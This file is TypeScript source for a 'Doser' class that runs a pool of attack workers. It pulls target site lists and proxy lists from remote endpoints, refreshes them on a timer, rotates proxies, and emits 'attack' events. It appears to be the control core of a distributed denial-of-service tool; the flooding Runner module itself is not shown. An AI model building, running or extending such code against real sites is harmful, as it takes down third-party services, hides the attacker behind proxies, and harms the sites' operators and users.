import { AxiosError } from 'axios-https-proxy-fix'
import { EventEmitter } from 'events'
import { DoserEventType, ProxyData, SiteData, GetSitesAndProxiesResponse, PrioritizedTarget } from './types'
import { Runner } from './runner'
import { getSites, getProxies } from './requests'
import { AxiosProxyConfig } from 'axios'

const CONFIGURATION_INVALIDATION_TIME = 300000*2


export class Doser {
  private onlyProxy: boolean
  private working: boolean
  private workers: Runner[] = []
  private numberOfWorkers = 0
  private eventSource: EventEmitter
  private prioritizedPairs: PrioritizedTarget[] = []
  sites: SiteData[]
  proxies: ProxyData[]
  maxPrioritizedWorkers : number = 0
  prioritizedWorkersNow: number = 0

  private verboseError: boolean;

  constructor (onlyProxy: boolean, numberOfWorkers: number, verboseError: boolean) {
    this.onlyProxy = onlyProxy
    this.working = false
    this.eventSource = new EventEmitter()
    this.verboseError = verboseError
    this.initialize(numberOfWorkers).catch(error => {
      console.error('Wasnt able to initialize:', error)
    })
    this.sites = []
    this.proxies = []
  }

  getPrioritizedTargets() {
    return this.prioritizedPairs
  }

  removePrioritizedTarget(what: SiteData, proxy: AxiosProxyConfig | undefined){
    for (let index = 0; index < this.prioritizedPairs.length; index++) {
      const element = this.prioritizedPairs[index];
      if(element.page == what && JSON.stringify(proxy) === JSON.stringify(element.proxyObj))  {
        this.prioritizedPairs.splice(index, 1)
        return
      }
      
    }
  }

  addPrioritizedTarget(what: SiteData, proxyObj: AxiosProxyConfig | undefined) {
    if(this.prioritizedPairs.length < this.maxPrioritizedWorkers) { 
      this.prioritizedPairs.push({
          page: what,
          proxyObj: proxyObj
        }
      )

    }
  }

  private logError (message:string, cause: unknown) {
    console.log(message)

    if (this.verboseError) {
      console.log(cause)
    } else {
      console.log((cause as AxiosError)?.message)
    }
  }

  private async initialize (numberOfWorkers: number, attemptNumber = 1): Promise<void> {
    await this.getSitesAndProxies()
    await this.updateSitesAndProxies()
    if (!this.sites || !this.proxies) {
      console.debug(`Wasnt able to get proxy configuration. Trying for ${attemptNumber} time`)
      return this.initialize(numberOfWorkers, attemptNumber + 1)
    }
    console.debug('Initialized doser', this.sites, this.proxies)
    this.listenForConfigurationUpdates()
    this.updateConfiguration()
    return this.setWorkersCount(numberOfWorkers)
  }

  forceProxy (newVal: boolean) {
    this.onlyProxy = newVal
    try {
      this.workers.forEach((worker, i) => {
        worker.setProxyActive(newVal)
        console.debug(`Changing runner proxy value ${i}..`)
      })

    } catch(err) {
      console.log(err)
    }
  }

  private updateConfiguration () {
    console.debug("CONFIGURATION UPDATED, REMOVING PRIORITIZED TARGETS")
    this.prioritizedPairs = []
    this.workers.forEach(worker => {
      worker.stopAddingPrioritized()
    })
  }

  private listenForConfigurationUpdates (wasPreviousUpdateSuccessful = true) {
    // eslint-disable-next-line @typescript-eslint/no-misused-promises
    setTimeout(async () => {
      await this.updateSitesAndProxies()
      if (!this.sites || !this.proxies) {
        console.debug('Wasnt able to get configuration updates')
        return this.listenForConfigurationUpdates(false)
      }
      this.updateConfiguration()
      this.listenForConfigurationUpdates(true)
    }, wasPreviousUpdateSuccessful ? CONFIGURATION_INVALIDATION_TIME : CONFIGURATION_INVALIDATION_TIME / 10)
  }

  async updateSitesAndProxies() {
    let obj = await this.getSitesAndProxies()
    if(obj) {
      this.sites = obj.sites
      this.proxies = obj.proxies      
    }
  }

  async getSitesAndProxies (): Promise<GetSitesAndProxiesResponse> {
    let proxies = undefined
    let sites = undefined
    while (this.working) { // escaping unavailable hosts
      try {
        if(proxies == undefined || proxies.status != 200){
          proxies = await getProxies()
        }
        if(sites == undefined || sites.status != 200) {
          sites = await getSites()
        }
        if (proxies == undefined || sites == undefined  || proxies.status != 200  || sites.status != 200) {
          continue
        }

        return {
          sites: sites.data,
          proxies: proxies.data
        }
      } catch (e) {
        this.logError('Error while loading hosts', e)
      }
    }
    return null
  }

  setWorkersCount (newCount: number) {
    this.maxPrioritizedWorkers = Math.floor(newCount / 1.33)
    console.debug(`Updating workers count to ${this.numberOfWorkers} => ${newCount}`)
    if (newCount < this.numberOfWorkers) {
      for (let i = this.numberOfWorkers; i >= newCount; i--) {
        this.workers[i]?.eventSource.removeAllListeners()
        this.workers[i]?.stop()
      }
      this.workers = this.workers.slice(0, newCount)
    } else {
      while (this.workers.length < newCount) {
        const newWorker = this.createNewWorker()
        this.workers.push(newWorker)
        if (this.working) {
          newWorker.start().catch(error => {
            console.debug('Wasnt able to start new runner:', error)
          })
        }
      }
    }

    this.numberOfWorkers = newCount
  }

  start () {
    this.working = true
    this.workers.forEach((worker, i) => {
      console.debug(`Starting runner ${i}..`)
      worker.start().catch(error => {
        console.error(`Wasnt able to start worker #${i} - `, error)
      })
    })
  }

  stop () {
    this.working = false
    this.workers.forEach((worker, i) => {
      console.debug(`Stopping runner ${i}..`)
      worker.stop()
    })
  }

  private createNewWorker (): Runner {
    console.debug('Creating new worker..')
    // Should never happen
    if (!this.sites || !this.proxies) {
      throw new Error('Cannot create worker without configuration')
    }
    const worker = new Runner({
      onlyProxy: this.onlyProxy,
      doserInstance: this
    })
    worker.eventSource.on('attack', event => {
      this.eventSource.emit('atack', {
        type: 'atack',
        ...event
      })
    })

    worker.eventSource.on('error', event => {
      if (this.verboseError) {
        this.eventSource.emit('error', event)
      }
    })
    return worker
  }

  listen (event: DoserEventType, callback: (data: any)=>void) {
    this.eventSource.addListener(event, callback)
  }
}
